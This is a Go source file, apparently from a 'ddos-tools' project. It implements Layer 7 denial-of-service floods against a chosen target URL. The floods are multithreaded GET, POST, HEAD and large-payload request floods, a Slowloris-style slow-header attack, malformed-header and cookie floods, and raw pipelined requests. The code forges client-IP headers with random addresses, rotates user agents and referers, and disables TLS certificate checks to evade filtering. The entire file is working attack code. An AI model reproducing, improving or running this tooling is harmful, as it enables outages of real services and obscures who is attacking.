package attacks

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"example.com/ddos-tools/pkg/proxy"
	"example.com/ddos-tools/pkg/utils"
)

// Layer7Config holds configuration for Layer 7 attacks
type Layer7Config struct {
	Method     string
	Target     string
	Threads    int
	RPC        int
	Duration   int
	Proxies    []proxy.Proxy
	UserAgents []string
	Referers   []string
}

// RunLayer7Attack executes a Layer 7 attack
func RunLayer7Attack(cfg *Layer7Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			for {
				select {
				case <-stopChan:
					return
				default:
					executeLayer7Method(cfg, requestsSent, bytesSent)
				}
			}
		}(i)
	}
}

func executeLayer7Method(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	switch cfg.Method {
	case "GET":
		executeGET(cfg, requestsSent, bytesSent)
	case "POST":
		executePOST(cfg, requestsSent, bytesSent)
	case "HEAD":
		executeHEAD(cfg, requestsSent, bytesSent)
	case "STRESS":
		executeSTRESS(cfg, requestsSent, bytesSent)
	case "SLOW":
		executeSLOW(cfg, requestsSent, bytesSent)
	case "NULL":
		executeNULL(cfg, requestsSent, bytesSent)
	case "COOKIE":
		executeCOOKIE(cfg, requestsSent, bytesSent)
	case "PPS":
		executePPS(cfg, requestsSent, bytesSent)
	default:
		executeGET(cfg, requestsSent, bytesSent)
	}
}

func executeGET(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	client := createHTTPClient(cfg)

	for i := 0; i < cfg.RPC; i++ {
		req, err := http.NewRequest("GET", cfg.Target, nil)
		if err != nil {
			continue
		}

		addHeaders(req, cfg)

		resp, err := client.Do(req)
		if err == nil {
			requestsSent.Add(1)
			bytesSent.Add(int64(estimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func executePOST(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	client := createHTTPClient(cfg)

	for i := 0; i < cfg.RPC; i++ {
		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(32))
		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
		if err != nil {
			continue
		}

		addHeaders(req, cfg)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

		resp, err := client.Do(req)
		if err == nil {
			requestsSent.Add(1)
			bytesSent.Add(int64(estimateRequestSize(req) + len(payload)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func executeHEAD(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	client := createHTTPClient(cfg)

	for i := 0; i < cfg.RPC; i++ {
		req, err := http.NewRequest("HEAD", cfg.Target, nil)
		if err != nil {
			continue
		}

		addHeaders(req, cfg)

		resp, err := client.Do(req)
		if err == nil {
			requestsSent.Add(1)
			bytesSent.Add(int64(estimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func executeSTRESS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	client := createHTTPClient(cfg)

	for i := 0; i < cfg.RPC; i++ {
		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(512))
		req, err := http.NewRequest("POST", cfg.Target, strings.NewReader(payload))
		if err != nil {
			continue
		}

		addHeaders(req, cfg)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

		resp, err := client.Do(req)
		if err == nil {
			requestsSent.Add(1)
			bytesSent.Add(int64(estimateRequestSize(req) + len(payload)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func executeSLOW(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	conn, err := createRawConnection(cfg.Target, cfg)
	if err != nil {
		return
	}
	defer conn.Close()

	headers := buildRawHeaders(cfg.Target, cfg)
	conn.Write([]byte(headers))
	requestsSent.Add(1)
	bytesSent.Add(int64(len(headers)))

	// Send keep-alive headers slowly
	for i := 0; i < cfg.RPC; i++ {
		time.Sleep(time.Duration(cfg.RPC) * time.Millisecond / 15)
		keepAlive := fmt.Sprintf("X-a: %d\r\n", utils.RandInt(1, 5000))
		conn.Write([]byte(keepAlive))
		bytesSent.Add(int64(len(keepAlive)))
	}
}

func executeNULL(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	conn, err := createRawConnection(cfg.Target, cfg)
	if err != nil {
		return
	}
	defer conn.Close()

	for i := 0; i < cfg.RPC; i++ {
		headers := buildRawHeaders(cfg.Target, cfg)
		headers = strings.ReplaceAll(headers, "User-Agent:", "User-Agent: null\r\n#")
		headers += "Referrer: null\r\n\r\n"

		conn.Write([]byte(headers))
		requestsSent.Add(1)
		bytesSent.Add(int64(len(headers)))
	}
}

func executeCOOKIE(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	client := createHTTPClient(cfg)

	for i := 0; i < cfg.RPC; i++ {
		req, err := http.NewRequest("GET", cfg.Target, nil)
		if err != nil {
			continue
		}

		addHeaders(req, cfg)
		cookie := fmt.Sprintf("_ga=GA%d; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s",
			utils.RandInt(1000, 99999),
			utils.RandString(6),
			utils.RandString(32))
		req.Header.Set("Cookie", cookie)

		resp, err := client.Do(req)
		if err == nil {
			requestsSent.Add(1)
			bytesSent.Add(int64(estimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func executePPS(cfg *Layer7Config, requestsSent, bytesSent *utils.Counter) {
	conn, err := createRawConnection(cfg.Target, cfg)
	if err != nil {
		return
	}
	defer conn.Close()

	targetURL, _ := url.Parse(cfg.Target)
	for i := 0; i < cfg.RPC; i++ {
		request := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			targetURL.Path, targetURL.Host)
		conn.Write([]byte(request))
		requestsSent.Add(1)
		bytesSent.Add(int64(len(request)))
	}
}

func createHTTPClient(cfg *Layer7Config) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	}

	// TODO: Add proxy support
	// if len(cfg.Proxies) > 0 {
	// 	proxy := cfg.Proxies[rand.Intn(len(cfg.Proxies))]
	// 	proxyURL, _ := url.Parse(proxy.URL())
	// 	transport.Proxy = http.ProxyURL(proxyURL)
	// }

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}
}

func createRawConnection(target string, cfg *Layer7Config) (net.Conn, error) {
	targetURL, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	host := targetURL.Host
	if !strings.Contains(host, ":") {
		if targetURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return nil, err
	}

	if targetURL.Scheme == "https" {
		tlsConn := tls.Client(conn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         targetURL.Hostname(),
		})
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, err
		}
		return tlsConn, nil
	}

	return conn, nil
}

func addHeaders(req *http.Request, cfg *Layer7Config) {
	if len(cfg.UserAgents) > 0 {
		req.Header.Set("User-Agent", cfg.UserAgents[rand.Intn(len(cfg.UserAgents))])
	}

	if len(cfg.Referers) > 0 {
		referer := cfg.Referers[rand.Intn(len(cfg.Referers))]
		req.Header.Set("Referer", referer+url.QueryEscape(cfg.Target))
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "max-age=0")

	// Spoof IP headers
	spoofIP := utils.RandIPv4()
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Forwarded-Host", cfg.Target)
	req.Header.Set("Via", spoofIP)
	req.Header.Set("Client-IP", spoofIP)
	req.Header.Set("Real-IP", spoofIP)
}

func buildRawHeaders(target string, cfg *Layer7Config) string {
	targetURL, _ := url.Parse(target)

	userAgent := "Mozilla/5.0"
	if len(cfg.UserAgents) > 0 {
		userAgent = cfg.UserAgents[rand.Intn(len(cfg.UserAgents))]
	}

	referer := "https://www.google.com/"
	if len(cfg.Referers) > 0 {
		referer = cfg.Referers[rand.Intn(len(cfg.Referers))]
	}

	spoofIP := utils.RandIPv4()

	headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path)
	headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
	headers += fmt.Sprintf("User-Agent: %s\r\n", userAgent)
	headers += fmt.Sprintf("Referer: %s\r\n", referer)
	headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	headers += "Accept-Language: en-US,en;q=0.9\r\n"
	headers += "Accept-Encoding: gzip, deflate, br\r\n"
	headers += "Connection: keep-alive\r\n"
	headers += "Cache-Control: max-age=0\r\n"
	headers += fmt.Sprintf("X-Forwarded-For: %s\r\n", spoofIP)
	headers += fmt.Sprintf("Via: %s\r\n", spoofIP)

	return headers
}

func estimateRequestSize(req *http.Request) int {
	size := len(req.Method) + len(req.URL.String()) + 10 // method + URL + protocol
	for k, v := range req.Header {
		for _, val := range v {
			size += len(k) + len(val) + 4 // key: value\r\n
		}
	}
	return size
}
